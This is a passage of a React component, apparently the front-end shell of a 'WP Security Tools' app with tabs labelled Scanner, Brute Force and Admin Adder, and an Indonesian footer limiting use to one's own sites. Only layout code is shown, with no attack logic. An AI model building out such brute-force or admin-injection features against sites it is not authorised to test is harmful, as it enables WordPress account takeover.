    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900">
      <Toaster position="top-right" richColors />
      
      <header className="border-b border-purple-800/30 bg-black/20 backdrop-blur-sm">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center">
              <Shield className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white">WP Security Tools</h1>
              <p className="text-xs text-purple-300">Scanner • Brute Force • Admin Adder</p>
            </div>
          </div>
          
          <div className="flex gap-2">
            {[
              { id: "scanner", label: "Scanner", icon: Scan, color: "green" },
              { id: "bruteforce", label: "Brute Force", icon: Zap, color: "red" },
              { id: "adder", label: "Admin Adder", icon: Code, color: "purple" }
            ].map(tab => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-4 py-2 rounded-lg transition-all ${
                  activeTab === tab.id 
                    ? `bg-${tab.color}-600 text-white` 
                    : "bg-white/10 text-purple-300 hover:bg-white/20"
                }`}
                style={activeTab === tab.id ? { backgroundColor: tab.color === "green" ? "#16a34a" : tab.color === "red" ? "#dc2626" : "#9333ea" } : {}}
              >
                <tab.icon className="w-4 h-4" />
                {tab.label}
              </button>
            ))}
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-8">
        {activeTab === "scanner" && <SecurityScanner />}
        {activeTab === "bruteforce" && <BruteForce />}
        {activeTab === "adder" && <AdminAdder />}
      </main>

      <footer className="border-t border-purple-800/30 bg-black/20 mt-12">
        <div className="max-w-7xl mx-auto px-4 py-6 text-center">
          <p className="text-sm text-gray-500">
            ⚠️ Tool ini hanya untuk security audit pada website milik Anda sendiri. Gunakan secara bertanggung jawab.
          </p>
        </div>
      </footer>
    </div>
  );
}

export default App;
